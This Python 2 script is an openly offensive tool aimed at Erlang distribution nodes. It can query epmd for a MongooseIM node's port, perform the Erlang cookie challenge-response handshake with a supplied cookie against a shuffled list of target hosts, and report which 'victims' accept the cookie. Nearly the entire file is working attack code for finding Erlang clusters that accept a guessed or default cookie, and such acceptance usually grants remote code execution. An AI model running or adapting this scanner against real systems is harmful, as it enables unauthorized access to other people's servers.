#!/usr/bin/env python2

from struct import pack, unpack
from socket import socket, AF_INET, SOCK_STREAM, SHUT_RDWR, timeout, error
from hashlib import md5
from random import choice, shuffle
from string import ascii_uppercase
import sys
import argparse
from time import sleep
import re


def rand_id(n=6):
  return ''.join([choice(ascii_uppercase) for c in range(n)]) + '@mars'

parser = argparse.ArgumentParser(description='Tests every cookie value in dictionary against victim, to successfully complete authentication.')

parser.add_argument('--refresh-with-epmd', action='store_true', help='Disable epmd check', default=False)
parser.add_argument('cookie', action='store', type=str, help='Value to cookie to test against')
parser.add_argument('targets', action='store', type=str, help='List of host:port to reach')
parser.add_argument('--delay', type=float, default=0.0, help='Amount of seconds (float) to sleep between attempts')

def send_name(name):
  return pack('!HcHI', 7 + len(name), 'n', 5, 0x3499c) + name

def send_challenge_reply(cookie, challenge):
  m = md5()
  m.update(cookie)
  m.update(challenge)
  response = m.digest()
  return pack('!HcI', len(response)+5, 'r', 0) + response



def refresh_erldp_port(host):
  sock = socket(AF_INET, SOCK_STREAM)

  sock.settimeout(20.0)

  sock.connect((host, 4369))

  sock.sendall('\x00\x01\x6e')
  data = sock.recv(4096)
  sock.close()

  for m in re.finditer(r'name (.*?) at port (\d+)', data):
    host = m.group(1)
    port = int(m.group(2))
    if host == 'mongooseim': return port



def does_cookie_authenticate(host, port):
  name = rand_id(6)

  sock = socket(AF_INET, SOCK_STREAM, 0)
  assert(sock)

  sock.settimeout(20.0)

  sock.connect((host, port))

  sock.sendall(send_name(name))

  data = sock.recv(5)
  assert(data == '\x00\x03\x73\x6f\x6b')

  data = sock.recv(4096)

  (length, tag, version, flags, challenge) = unpack('!HcHII', data[:13])
  challenge = '%u' % challenge

  sock.sendall(send_challenge_reply(args.cookie, challenge))

  data = sock.recv(3)
  if len(data) == 0:
    sock.close()
    return False
  else:
    assert(data == '\x00\x11\x61')
    digest = sock.recv(16)
    assert(len(digest) == 16)
    sock.close()

    return True

args = parser.parse_args()



f = open(args.targets, 'rb')
targets = [l.rstrip('\n') for l in f.readlines()]
shuffle(targets)
n_targets = len(targets)

n_no_epmd = 0
n_not_accessible = 0
n_not_challenging = 0
n_valid_cookie = 0
n_wrong_cookie = 0

def prRed(skk): print("\033[91m {}\033[00m" .format(skk)) 
def prGreen(skk): print("\033[92m {}\033[00m" .format(skk)) 
def prYellow(skk): print("\033[93m {}\033[00m" .format(skk))

for i in range(n_targets):
  (host, port) = targets[i].split(':')
  port = int(port)

  if args.refresh_with_epmd:
    try:
      port = refresh_erldp_port(host)
      if port is None: raise error()
    except error:
      n_no_epmd += 1
      prRed('%s\t\t\tno epmd' % (host))
      continue
  else:
    pass

  try:
    if does_cookie_authenticate(host, port):
      n_valid_cookie += 1
      prGreen('%s:%d\t\tvalid' % (host, port))
    else:
      n_wrong_cookie += 1
      prYellow('%s:%d\t\tinvalid' % (host, port))
  except error:
    n_not_accessible += 1
    prRed('%s:%d\t\tnot accessible' % (host, port))
  except timeout:
    n_not_challenging += 1
    prRed('%s:%d\t\tnot challenging ' % (host, port))


print('total victims %d valid %d no epmd %d invalid %d not accessible %d not challenging %d' % (n_targets, n_valid_cookie, n_no_epmd, n_wrong_cookie, n_not_accessible, n_not_challenging))

